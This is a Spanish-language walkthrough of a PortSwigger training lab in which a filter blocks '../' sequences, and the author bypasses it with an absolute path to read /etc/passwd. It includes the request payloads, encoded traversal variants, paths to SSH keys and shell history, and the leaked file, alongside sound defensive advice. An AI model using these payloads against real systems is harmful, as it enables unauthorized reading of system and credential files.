# Write-up - PortSwigger Lab 18

Voy a hacer un laboratorio de Port Swigger. El lab 18 de Path Traversal.

URL del laboratorio:

```text
https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Laboratorio: Traversal de rutas de archivos, secuencias bloqueadas con bypass mediante ruta absoluta

Este laboratorio contiene una vulnerabilidad de recorrido de rutas (`path traversal`) en la visualización de imágenes de productos.

La aplicación bloquea las secuencias de traversal, pero trata el nombre de archivo proporcionado como si fuera relativo a un directorio de trabajo por defecto.

Para resolver el laboratorio, recupera el contenido del archivo:

```text
/etc/passwd
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Objetivo principal

El objetivo de este laboratorio es leer un archivo sensible del sistema operativo Linux:

```text
/etc/passwd
```

Este archivo contiene información de usuarios del sistema.

No contiene contraseñas en texto claro en sistemas modernos, pero sí contiene:

- nombres de usuarios;
- UID;
- GID;
- directorio home;
- shell asignada;
- cuentas del sistema;
- usuarios de aplicación.

En estos laboratorios, leer `/etc/passwd` confirma que tenemos una vulnerabilidad de lectura arbitraria de archivos mediante path traversal.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Concepto clave: Path Traversal

Un `path traversal` ocurre cuando una aplicación permite que el usuario controle parte de una ruta de archivo y no valida correctamente esa entrada.

Ejemplo típico:

```text
/image?filename=17.jpg
```

La aplicación recibe:

```text
17.jpg
```

y probablemente construye internamente una ruta como:

```text
/var/www/images/17.jpg
```

El problema aparece si el usuario puede cambiar `17.jpg` por algo como:

```text
../../../../../etc/passwd
```

Entonces la aplicación podría terminar leyendo:

```text
/etc/passwd
```

Eso es path traversal.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Diferencia con el laboratorio anterior

En el laboratorio anterior, el payload clásico funcionaba:

```text
../../../../../etc/passwd
```

En este laboratorio, la aplicación bloquea las secuencias de traversal como:

```text
../
```

Por tanto, si intentamos usar el payload típico, no funciona.

La clave de este laboratorio es entender que aunque la aplicación bloquee `../`, todavía podemos usar una ruta absoluta:

```text
/etc/passwd
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Qué significa “bypass mediante ruta absoluta”

Una ruta relativa depende del directorio actual.

Ejemplo:

```text
17.jpg
```

Si la aplicación busca imágenes en:

```text
/var/www/images/
```

entonces `17.jpg` se interpreta como:

```text
/var/www/images/17.jpg
```

Una ruta absoluta, en Linux, empieza por `/`.

Ejemplo:

```text
/etc/passwd
```

Esa ruta no significa “busca dentro del directorio de imágenes”.

Significa:

```text
empieza desde la raíz del sistema de archivos
```

Por eso, aunque la aplicación bloquee `../`, si acepta rutas absolutas, podemos saltarnos el filtro.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Vamos a llevar a cabo esto de forma práctica

Le damos a empezar laboratorio y se nos abre la siguiente página web:

```text
https://0ab200e9040480c4805fc17e00d400ba.web-security-academy.net/
```

La página web tiene el aspecto de la imagen 1.

![Imagen 1](imagenes/imagen1.png)

**Referencia a la imagen 1:** Vista inicial del laboratorio. Se observa la tienda de PortSwigger con varios productos. El laboratorio indica que existe una vulnerabilidad en la visualización de imágenes de productos.

Una vez dentro, abrimos BurpSuitePro y en el navegador activamos FoxyProxy para que en el HTTP History vayan apareciendo las distintas requests mientras navegamos por la página.

Como ya nos dice el laboratorio, contiene una vulnerabilidad de recorrido de rutas (`path traversal`) en la visualización de imágenes de productos.

Por tanto, no nos centramos en el parámetro `productId` como objetivo principal, sino en cómo se cargan las imágenes.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Localización del endpoint vulnerable

Clickeamos en un producto.

Después, en la web, hacemos click derecho sobre la imagen y le damos a:

```text
Open Image In New Tab
```

Esto nos lleva a la siguiente URL:

```text
https://0ab200e9040480c4805fc17e00d400ba.web-security-academy.net/image?filename=17.jpg
```

Aquí vemos claramente el endpoint interesante:

```text
/image
```

y el parámetro vulnerable potencial:

```text
filename=17.jpg
```

El parámetro que realmente nos interesa es:

```text
image?filename=17.jpg
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Petición legítima de imagen

Capturamos esa petición:

```http
GET /image?filename=17.jpg HTTP/1.1
Host: 0ab200e9040480c4805fc17e00d400ba.web-security-academy.net
Cookie: session=O3LM3e4NrPNGGjBHKS2VPcavhiQ0jWvS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Análisis de la petición

La parte importante es:

```http
GET /image?filename=17.jpg HTTP/1.1
```

Aquí el navegador está pidiendo al servidor que le devuelva el archivo:

```text
17.jpg
```

La aplicación probablemente hace algo parecido a esto:

```python
open("/var/www/images/" + filename)
```

o:

```php
readfile("/var/www/images/" . $_GET["filename"]);
```

Si `filename` es:

```text
17.jpg
```

se lee una imagen normal.

Pero si controlamos `filename`, podemos intentar leer otro archivo.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Primer intento: traversal clásico

Probamos a hacer:

```http
GET /image?filename=../../../../../etc/passwd HTTP/2
```

Esto sería el payload clásico para subir directorios hasta la raíz del sistema y luego leer `/etc/passwd`.

La respuesta es:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"No such file"
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Interpretación del primer fallo

El servidor responde:

```text
"No such file"
```

y devuelve:

```http
HTTP/2 400 Bad Request
```

Esto significa que el payload clásico no ha funcionado.

¿Por qué?

Porque el laboratorio ya nos avisaba:

```text
La aplicación bloquea las secuencias de traversal
```

Las secuencias de traversal son:

```text
../
```

Por tanto, la aplicación probablemente tiene un filtro que detecta esas cadenas.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Por qué falla `../../../../../etc/passwd`

La aplicación puede estar haciendo algo parecido a esto:

```python
if "../" in filename:
    return "No such file"
```

o:

```php
if (strpos($filename, "../") !== false) {
    die("No such file");
}
```

Esto es una blacklist.

Una blacklist intenta bloquear patrones concretos.

En este caso, el patrón bloqueado es:

```text
../
```

Entonces, cuando enviamos:

```text
../../../../../etc/passwd
```

la aplicación detecta varias veces `../` y bloquea la petición.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# El problema de las blacklists

El problema de las listas negras es que bloquean una técnica concreta, pero no necesariamente bloquean el acceso real al archivo.

La aplicación intenta impedir que subamos directorios con:

```text
../
```

Pero no valida correctamente que el archivo final esté dentro del directorio permitido.

Eso es lo importante.

Una defensa correcta no debería limitarse a bloquear `../`.

Una defensa correcta debería comprobar que la ruta final resuelta sigue dentro del directorio de imágenes.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Bypass mediante ruta absoluta

Como las secuencias `../` están bloqueadas, probamos otra técnica:

usar directamente la ruta absoluta:

```text
/etc/passwd
```

Esto evita completamente `../`.

No necesitamos subir directorios.

Le decimos directamente al sistema:

```text
lee /etc/passwd desde la raíz
```

Por tanto, modificamos la petición para que quede así:

```http
GET /image?filename=/etc/passwd HTTP/2
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Por qué `/etc/passwd` puede funcionar

En Linux, las rutas absolutas empiezan por:

```text
/
```

Ejemplos:

```text
/etc/passwd
/var/log/auth.log
/home/carlos/.ssh/id_rsa
/root/.bash_history
```

Cuando una ruta empieza por `/`, se interpreta desde la raíz del sistema de archivos.

No depende del directorio actual.

Por eso, si la aplicación no impide rutas absolutas, podemos saltarnos el bloqueo de `../`.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Resultado del bypass

Al enviar:

```http
GET /image?filename=/etc/passwd HTTP/2
```

obtenemos:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316
```

Y el contenido de la respuesta incluye el contenido de `/etc/passwd`, por ejemplo:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34::/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Observación importante sobre el Content-Type

Aunque la respuesta tiene:

```http
Content-Type: image/jpeg
```

el contenido real no es una imagen.

El contenido real es texto del archivo:

```text
/etc/passwd
```

Esto ocurre porque el endpoint está pensado para devolver imágenes y probablemente siempre marca la respuesta como `image/jpeg`, independientemente del archivo leído.

Pero el cuerpo de la respuesta demuestra que hemos leído correctamente `/etc/passwd`.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Confirmación del laboratorio resuelto

De hecho, si vemos en la web, nos dice laboratorio solucionado (imagen 2).

![Imagen 2](imagenes/imagen2.png)

**Referencia a la imagen 2:** Banner de PortSwigger indicando que el laboratorio está resuelto. Esto confirma que el archivo `/etc/passwd` se ha recuperado correctamente.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Anatomía del Bypass mediante Ruta Absoluta

## 1. El fallo del primer intento (`../../`)

Cuando envías:

```text
filename=../../../../../etc/passwd
```

recibes:

```http
400 Bad Request
```

y:

```text
"No such file"
```

Esto ocurre porque la aplicación tiene implementada una lista negra (`blacklist`).

El código del servidor probablemente hace algo como esto:

```python
# Pseudocódigo de seguridad débil
if "../" in filename:
    return "No such file"
```

La aplicación busca la cadena de caracteres:

```text
../
```

y, si la encuentra, bloquea la petición.

Es un control de seguridad común, pero mal diseñado, porque solo busca una técnica específica: subir niveles con `../`.

No valida el destino final de la ruta.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 2. ¿Por qué funciona la Ruta Absoluta `/etc/passwd`?

Aquí está el secreto.

Los sistemas de archivos Linux tienen dos formas principales de interpretar rutas:

## A. Rutas relativas

Una ruta relativa depende de un directorio base.

Ejemplo:

```text
17.jpg
```

Si la aplicación busca imágenes en:

```text
/var/www/app/images/
```

entonces:

```text
17.jpg
```

se interpreta como:

```text
/var/www/app/images/17.jpg
```

## B. Rutas absolutas

Una ruta absoluta empieza por:

```text
/
```

Ejemplo:

```text
/etc/passwd
```

Esa ruta no depende del directorio base.

Va directamente desde la raíz del sistema.

Por eso, si la aplicación recibe:

```text
/etc/passwd
```

y no bloquea rutas absolutas, puede acabar leyendo ese archivo directamente.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 3. Qué pasa en el servidor

La aplicación recibe:

```text
/etc/passwd
```

El filtro busca:

```text
../
```

No lo encuentra.

Por tanto, la petición pasa el filtro.

Después, la aplicación intenta abrir el archivo.

Dependiendo del lenguaje y de cómo esté implementado el acceso a archivos, puede ocurrir que la ruta absoluta sobrescriba o ignore el directorio base esperado.

El resultado final es que se abre:

```text
/etc/passwd
```

y no:

```text
/var/www/images/etc/passwd
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 4. El concepto de “Directorio de Trabajo”

El enunciado del laboratorio dice algo clave:

```text
La aplicación trata el nombre de archivo proporcionado como si fuera relativo a un directorio de trabajo por defecto.
```

Esto significa que el programador confía en que el usuario solo enviará nombres de archivo como:

```text
17.jpg
```

o:

```text
58.jpg
```

Pero no previó que el usuario podría enviar:

```text
/etc/passwd
```

Al no haber secuencias:

```text
../
```

el filtro de traversal no se activa.

Pero el resultado sigue siendo el mismo:

```text
lectura de un archivo fuera del directorio permitido
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Por qué esta defensa es insuficiente

Bloquear solamente:

```text
../
```

no basta.

Un atacante puede intentar:

```text
/etc/passwd
```

o variantes como:

```text
....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f
```

En este laboratorio concreto, el bypass correcto es la ruta absoluta.

La defensa correcta sería:

1. Resolver la ruta final de forma canónica.
2. Comprobar que la ruta final queda dentro del directorio permitido.
3. Rechazar rutas absolutas.
4. Usar una whitelist de nombres de archivo válidos.
5. No construir rutas directamente con input de usuario.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Resumen técnico completo

La secuencia completa del laboratorio ha sido:

1. Abrimos el laboratorio.
2. Navegamos por la tienda.
3. Identificamos que las imágenes se cargan mediante:

```http
/image?filename=17.jpg
```

4. Capturamos la petición con BurpSuite.
5. Probamos traversal clásico:

```text
../../../../../etc/passwd
```

6. La aplicación lo bloquea.
7. Interpretamos que hay blacklist contra `../`.
8. Probamos ruta absoluta:

```text
/etc/passwd
```

9. La aplicación no detecta `../`.
10. El servidor lee `/etc/passwd`.
11. Recuperamos el contenido del archivo.
12. El laboratorio se marca como resuelto.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Payloads utilizados

## Petición legítima

```http
GET /image?filename=17.jpg HTTP/1.1
```

## Intento bloqueado

```http
GET /image?filename=../../../../../etc/passwd HTTP/2
```

## Bypass correcto mediante ruta absoluta

```http
GET /image?filename=/etc/passwd HTTP/2
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Resultado obtenido

Se recuperó el contenido del archivo:

```text
/etc/passwd
```

Entre las líneas visibles aparecen usuarios como:

```text
root
daemon
www-data
peter
carlos
user
elmer
academy
mysql
postgres
```

Esto confirma lectura arbitraria de archivos mediante path traversal.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Conclusión

Este laboratorio demuestra una variante importante de path traversal.

La aplicación intenta protegerse bloqueando secuencias como:

```text
../
```

Pero esa defensa es incompleta.

El bypass consiste en no usar traversal relativo y enviar directamente una ruta absoluta:

```text
/etc/passwd
```

La aplicación no detecta `../`, por tanto no bloquea la petición.

El sistema de archivos interpreta la ruta desde la raíz y devuelve el archivo solicitado.

FRASE CLAVE:

```text
Si bloquean subir directorios con ../, prueba a empezar directamente desde la raíz.
```

**Laboratorio resuelto.**

